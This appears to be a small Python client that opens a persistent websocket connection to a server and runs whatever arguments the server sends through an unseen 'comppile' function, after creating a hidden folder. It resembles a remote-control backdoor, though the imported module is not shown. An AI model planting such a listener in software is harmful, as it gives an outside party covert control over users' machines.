import json
import websockets
import asyncio
import threading
from comppilator import *

create_hidden_folder(store)


async def listen_server(uri):
    while True:
        try:
            async with websockets.connect(uri) as websocket:
                while True:
                    data = json.loads(await websocket.recv())

                    data = json.loads(data)

                    if data.get("run"):
                        print(data["args"])
                        thread = threading.Thread(target=comppile, args=(data["args"],))
                        thread.start()
        except Exception as e:
            print(e)
            sleep(10)

if __name__ == '__main__':
    asyncio.run(listen_server(f'{link.replace("http", "ws")}ws'))
